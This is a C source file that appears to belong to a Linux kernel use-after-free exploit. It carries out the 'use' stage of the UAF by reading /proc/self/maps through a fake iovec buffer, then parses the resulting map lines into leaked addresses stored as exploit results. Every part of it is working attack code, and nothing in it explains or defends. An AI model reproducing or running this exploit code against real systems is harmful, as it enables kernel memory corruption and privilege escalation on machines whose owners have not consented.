#include "../nolibc/nolibc.h"
#include "../consts/log.h"
#include "../sys/uio.h"
#include "../utils/string.h"
#include "nodes_master_free_use.h"
#include "nodes_master_and_use.h"
#include "nodes_free_and_use.h"

#define BUFSZ_PROC_MAPS 1024
static char buf_proc_maps[BUFSZ_PROC_MAPS];

#define FAKE_BUFFER_ADDR ((void *)1)
#define FAKE_BUFFER_SIZE (1024 * 1024 * 1024)

static int __gen_proc_maps(void)
{
	int fd, err;
	struct iovec iov;
	long retval;

	fd = fd_proc_maps;
	err = 0;

	retval = read(fd, buf_proc_maps, BUFSZ_PROC_MAPS);
	if (retval < 0) {
		err = 1;
		perror(L_ERROR
		       "[-] Cannot read from \"/proc/self/maps\" (initialize the kernel buffer)");
	}

	uaf_ready_to_go = 1;

	iov.iov_base = FAKE_BUFFER_ADDR;
	iov.iov_len = FAKE_BUFFER_SIZE;

	retval = readv(fd, &iov, 1);
	if (retval < 0 && errno != EFAULT) {
		err = 1;
		perror(L_ERROR
		       "[-] Cannot read from \"/proc/self/maps\" (fill the kernel buffer)");
	}

	return err ? -1 : 0;
}

static int __load_proc_maps(void)
{
	int fd;
	long retval;

	fd = fd_proc_maps;

	for (;;) {
		retval = read(fd, buf_proc_maps, BUFSZ_PROC_MAPS - 1);
		if (retval > 0)
			buf_proc_maps[retval] = 0;
		else
			break;
	}

	if (retval < 0) {
		perror(L_ERROR
		       "[-] Cannot read from \"/proc/self/maps\" (copy to the userspace buffer)");
		return retval;
	}

	return 0;
}

static void load_proc_maps(void)
{
	int retval;

	retval = __gen_proc_maps();
	if (retval < 0)
		exit(-1);

	if (healthcheck_state == HEALTHCHECK_FREE)
		++healthcheck_state;
	fputs(L_DOING "[ ] UAF state update: \"use\" has been completed\n",
	      stderr);

	retval = __load_proc_maps();
	if (retval < 0)
		exit(-1);

	puts(buf_proc_maps);
}

static int check_no_vsyscall(const char *line, const char *nline)
{
	const char *s;

	for (s = line; s < nline; ++s)
		if (starts_with(s, "[vsyscall]"))
			return -1;

	return 0;
}

static void __parse_proc_maps(const char *line)
{
	unsigned long v1, v2;
	const char *s, *t;

	s = parse_hex(line, &v1);
	if (s == line) {
		fputs(L_ERROR
		      "[-] Cannot parse memory maps: Invalid start address\n",
		      stderr);
		exit(-1);
	}

	if (*s != '-') {
		fputs(L_ERROR
		      "[-] Cannot parse memory maps: Invalid separator between addresses\n",
		      stderr);
		exit(-1);
	}
	++s;

	t = parse_hex(s, &v2);
	if (t == s) {
		fputs(L_ERROR
		      "[-] Cannot parse memory maps: Invalid end addresses\n",
		      stderr);
		exit(-1);
	}

	fprintf(stderr,
		L_DONE "[+] Parsed from memory maps: word %lx, word %lx\n", v1,
		v2);
	exploit_results[0] = v1;
	exploit_results[1] = v2;
}

static void parse_proc_maps(void)
{
	const char *line, *nline, *nnline;
	int retval;

	line = next_line(buf_proc_maps);
	if (!line || !*line) {
		fputs(L_ERROR
		      "[-] Unexpected memory map format: No second line\n",
		      stderr);
		exit(-1);
	}

	nline = next_line(line);
	if (!nline || !*nline) {
		fputs(L_ERROR
		      "[-] Unexpected memory map format: No third line\n",
		      stderr);
		exit(-1);
	}

	nnline = next_line(nline);
	if (nnline && *nnline) {
		fputs(L_ERROR
		      "[-] Unsuccessful exploit trial: Memory maps contain the fourth line\n",
		      stderr);
		exit(-1);
	}

	retval = check_no_vsyscall(line, nline);
	if (retval < 0) {
		fputs(L_ERROR
		      "[-] Unsuccessful exploit trial: Memory maps contain the [vsyscall] line\n",
		      stderr);
		exit(-1);
	}

	__parse_proc_maps(line);
}

static int run_node_use(void)
{
	load_proc_maps();

	parse_proc_maps();

	return 0;
}
